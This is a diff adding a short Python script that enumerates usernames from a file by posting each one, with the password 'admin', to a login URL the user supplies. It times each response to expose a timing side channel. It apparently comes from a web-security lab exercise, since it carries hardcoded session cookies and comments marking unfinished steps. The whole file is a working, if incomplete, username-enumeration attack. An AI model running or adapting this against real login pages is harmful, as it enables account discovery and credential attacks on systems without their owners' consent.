@@ -1,0 +1,41 @@
+#!/usr/bin/python3
+import pyinputplus as pyip
+import urllib3, datetime as dt
+import requests
+
+# make a request to the landing page:
+URL = pyip.inputStr("Enter a URL for login: ")
+URL = URL.strip()
+print(URL)
+
+## need to iterate with the usernames
+
+fd = open('./username.txt', 'r')
+
+# need to initialize a pool, 
+
+URLpool = urllib3.PoolManager()
+
+cookies = {'session' : 'nh4ApjIUW6Sf4cha1WDWyr7mtTnAQ4p6'}  
+
+headers = {
+    'Cookie' : 'La614upUoDGgnwQfX5a6OZ0vkUdRU0Sw'
+}
+
+for user in fd.readlines():
+    t1s = dt.datetime.now()
+    payload = f"username={user}&password=admin"
+
+    r = URLpool.request('POST', URL, body=payload, headers=headers)
+    t2s = dt.datetime.now()
+    delta = t2s - t1s
+    print('username - {} : {: >20}.{}'.format(user, delta.seconds, delta.microseconds))
+
+
+
+## need to check for response timings. 
+
+fd.close()
+
+
+
